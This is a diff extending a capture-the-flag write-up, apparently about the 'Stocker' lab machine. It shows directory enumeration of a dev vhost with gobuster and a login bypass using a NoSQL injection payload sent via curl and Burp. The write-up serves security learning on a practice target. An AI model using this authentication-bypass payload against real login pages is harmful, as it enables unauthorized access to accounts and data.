@@ -108,7 +108,59 @@ Now let's check this vhost on browser:
 
 Let's enumerate dev login vhost:
 
-````shell
+```shell
 ╰─ whatweb http://dev.stocker.htb/login |tee -a what_web_devlogin.txt                                                                                                                    ─╯
 http://dev.stocker.htb/login [200 OK] Bootstrap, Cookies[connect.sid], Country[RESERVED][ZZ], HTML5, HTTPServer[Ubuntu Linux][nginx/1.18.0 (Ubuntu)], HttpOnly[connect.sid], IP[10.129.237.131], Meta-Author[Mark Otto, Jacob Thornton, and Bootstrap contributors], MetaGenerator[Hugo 0.84.0], PasswordField[password], Script, Title[Stockers Sign-in], X-Powered-By[Express], nginx[1.18.0]
 ```
+
+Run gobuster dir:
+
+```shell
+╰─ gobuster dir --url http://dev.stocker.htb --wordlist /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-small.txt -o gobuster_devlogin.txt                                    ─╯
+===============================================================
+Gobuster v3.5
+by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
+===============================================================
+[+] Url:                     http://dev.stocker.htb
+[+] Method:                  GET
+[+] Threads:                 10
+[+] Wordlist:                /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-small.txt
+[+] Negative Status codes:   404
+[+] User Agent:              gobuster/3.5
+[+] Timeout:                 10s
+===============================================================
+2023/03/05 19:57:08 Starting gobuster in directory enumeration mode
+===============================================================
+/login                (Status: 200) [Size: 2667]
+/static               (Status: 301) [Size: 179] [--> /static/]
+/Login                (Status: 200) [Size: 2667]
+/logout               (Status: 302) [Size: 28] [--> /login]
+/stock                (Status: 302) [Size: 48] [--> /login?error=auth-required]
+/Logout               (Status: 302) [Size: 28] [--> /login]
+/Static               (Status: 301) [Size: 179] [--> /Static/]
+Progress: 87586 / 87665 (99.91%)
+===============================================================
+2023/03/05 20:02:46 Finished
+===============================================================
+```
+
+After some research I diceded to [basic authentication bypass](https://book.hacktricks.xyz/pentesting-web/nosql-injection#basic-authentication-bypass), 
+Exactly change POST with 'Content-Type: application/json' sending {"username": {"$ne": null}, "password": {"$ne": null}}'.
+
+Trying with curl:
+
+```shell
+╰─ curl -X POST -d '{"username": {"$ne": null}, "password": {"$ne": null}}' -H 'Content-Type: application/json'  http://dev.stocker.htb/login                                              ─╯
+Found. Redirecting to /stock% 
+```
+
+Trying with Burp:
+
+Testing on repeater:
+![burp_repeater.jpg](IMG/burp_repeater.jpg)
+
+Seems redirect to stock, try now with proxy:
+
+![burp_proxy_bypass.jpg](IMB/../IMG/burp_proxy_bypass.jpg)
+
+It works!
